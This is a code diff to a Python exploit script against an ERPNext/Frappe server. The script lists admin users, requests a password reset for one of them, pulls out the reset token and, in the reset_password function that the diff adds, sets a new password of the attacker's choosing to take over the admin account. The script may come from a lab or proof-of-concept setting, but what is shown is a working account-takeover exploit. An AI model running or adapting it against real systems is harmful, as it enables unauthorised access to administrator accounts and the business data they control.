@@ -69,7 +69,24 @@ def extract_password_reset_token(session, url, user, proxies=None):
                 break
         return reset_token
     else:
-        print(F"Error in get_admin_users: {res.status_code}, {res.content}")
+        print(F"Error in extract_password_reset_token: {res.status_code}, {res.content}")
+        exit(1)
+def reset_password(session, url, reset_token, username, password='@Donkey1234',proxies=None):
+    url += '/update-password?key=qDObkZaaLmu9vkwqLaO4F07FbFDyKOxK'
+    data = {"key": F"{reset_token}", "old_password": '', "new_password": F"{password}", "logout_all_sessions": "1", "cmd": "frappe.core.doctype.user.user.update_password"}
+    res = None
+    if proxies!= None:
+        res = session.post(url, data=data, proxies=proxies)
+    else:
+        res = session.post(url, data=data)
+    if res.status_code == 200:
+        parsed = res.json()
+        if 'home_page' in parsed:
+            print(F'Username: {username}')
+            print(F'Password: {password}')
+        
+    else:
+        print(F"Error in reset_password: {res.status_code}, {res.content}")
         exit(1)
 if __name__ == '__main__':
     url = "http://erpnext:8000/"
@@ -80,7 +97,7 @@ if __name__ == '__main__':
     }
     admin_users = get_admin_users(session, url)
     user = admin_users[1]
-    print(admin_users)
+    print('Admin users: ', admin_users)
     request_password_reset(session, url, user)
     reset_token = extract_password_reset_token(session, url, user)
-    
+    reset_password(session, url, reset_token, user, password='@Chickenboy123')
